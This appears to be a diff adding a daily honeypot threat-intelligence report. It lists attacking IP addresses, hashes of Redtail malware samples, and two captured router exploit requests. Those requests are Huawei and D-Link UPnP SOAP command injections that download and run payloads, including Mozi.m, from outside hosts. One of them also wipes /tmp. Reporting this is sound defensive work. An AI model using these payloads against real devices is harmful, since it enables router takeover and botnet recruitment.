@@ -1,0 +1,56 @@
+Top 5 IPs for 2024-06-20 :
+
+120.26.3.153
+128.199.99.204
+58.26.142.33
+112.171.80.169
+220.74.115.23
+
+Malware Observed:
+
+
+File name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+
+File name : redtail.arm7
+ea9f3911ff2884621874c1e98b5dc9139964adeab333b92816eb5c307d73a67f
+https://www.virustotal.com/gui/file/ea9f3911ff2884621874c1e98b5dc9139964adeab333b92816eb5c307d73a67f
+
+File name : redtail.arm8
+720b3d089679f26e02c2f9bf05a466e768557b91627e840a2cd26eb480dc8418
+https://www.virustotal.com/gui/file/720b3d089679f26e02c2f9bf05a466e768557b91627e840a2cd26eb480dc8418
+
+File name : redtail.i686
+9ef2ef02376445bf4c145820c0c81f2bbe0b96f2017278562e0bd259bf7bd061
+https://www.virustotal.com/gui/file/9ef2ef02376445bf4c145820c0c81f2bbe0b96f2017278562e0bd259bf7bd061
+
+File name : redtail.x86_64
+ab897157fdef11b267e986ef286fd44a699e3699a458d90994e020619653d2cd
+https://www.virustotal.com/gui/file/ab897157fdef11b267e986ef286fd44a699e3699a458d90994e020619653d2cd
+
+
+
+Commands/exploits observed:
+
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
+Connection: keep-alive
+Accept: */*
+Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"
+Content-Length: 453
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g 185.244.36.200 -l /tmp/xxtea -r /hmips; /bin/busybox chmod 777 /tmp/xxtea; /tmp/xxtea huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
+
+
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+Host: <host ip>
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Hello, World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://120.142.34.167:4540/Mozi.m;/tmp/Mozi.m dlink`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
+
